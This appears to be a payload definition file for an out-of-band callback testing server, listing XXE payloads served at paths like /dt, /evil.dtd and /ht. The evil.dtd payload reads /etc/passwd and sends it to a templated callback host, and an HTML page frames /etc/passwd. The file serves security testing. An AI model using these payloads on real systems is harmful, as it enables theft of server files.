---
title: XXE
description: More XXE
weight: 1
payloads:
  - sort_order: 1
    pattern: /dt$
    is_final: true
    data:
      headers:
      Content-Type: text/xml
      body: |-
        <?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
          <!ELEMENT foo ANY >
          <!ENTITY xxe SYSTEM "http://{{ .Host }}/{{ .NotifyString }}/xxe-test" >
        ]>
        <foo>&xxe;</foo>

  - sort_order: 1
    pattern: /evil\.dtd$
    is_final: true
    data:
      headers:
        Content-Type: text/xml
      body: |-
        <!ENTITY % payl SYSTEM "file:///etc/passwd">
        <!ENTITY % int "<!ENTITY % trick SYSTEM 'http://{{ .Host }}:80/{{ .NotifyString }}/xxe?p=%payl;'>">

  - sort_order: 1
    pattern: /xxe-test$
    is_final: true
    data:
      headers:
        Content-Type: text/plain
      body: I should be loaded from http://{{ .Host }}/dt

  - sort_order: 1
    pattern: /ht$
    is_final: true
    data:
      headers:
        Content-Type: text/html
      body: |
        <html>
        <body>
          <img src="{{.NotifyString}}/static-lh" />
          <iframe src="file:///etc/passwd" height="500"></iframe>
        </body>
        </html>

---

### /dt

A vulnerable application for testing is in [../../../../cmd/xodbox-validator](../../../../cmd/xodbox-validator)


### /evil.dtd

dtd for use by others

### /ht

I frame callback
